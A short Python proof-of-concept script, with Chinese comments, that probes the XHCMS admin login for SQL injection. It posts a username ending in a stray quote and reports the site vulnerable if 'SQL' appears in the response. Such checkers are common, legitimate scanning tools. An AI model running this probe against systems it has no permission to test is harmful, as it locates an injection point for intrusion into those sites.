# 修改后的XHCMS SQL注入检测POC
# 保存为xhcms_sqli_poc.py
import requests
from urllib.parse import urljoin

def verify(target):
    """
    检测/xhcms/admin/?r=login路径的SQL注入漏洞
    通过POST方式发送恶意载荷，检测响应内容特征
    """
    try:
        # 标准化目标URL
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target

        # 构造请求URL
        post_url = urljoin(target, "/xhcms/admin/?r=login")

        # 构造恶意载荷（包含SQL注入单引号）
        payload = {
            'user': "123'",  # 注入点
            'password': '123',
            'login': 'yes'
        }

        # 发送POST请求
        response = requests.post(
            post_url,
            data=payload,
            allow_redirects=False,
            timeout=10,
            verify=False,
            headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) POC_Scanner/1.0'
            }
        )

        # 漏洞判断逻辑
        if response.status_code == 200:
            # 检测SQL错误特征
            if "SQL" in response.text:
                return {
                    'vulnerable': True,
                    'details': f"检测到SQL注入漏洞，响应特征: {response.text[:150]}..."
                }
        return {'vulnerable': False}

    except requests.exceptions.RequestException as e:
        return {
            'vulnerable': False,
            'error': f"请求失败: {str(e)}"
        }
    except Exception as e:
        return {
            'vulnerable': False,
            'error': f"验证异常: {str(e)}"
        }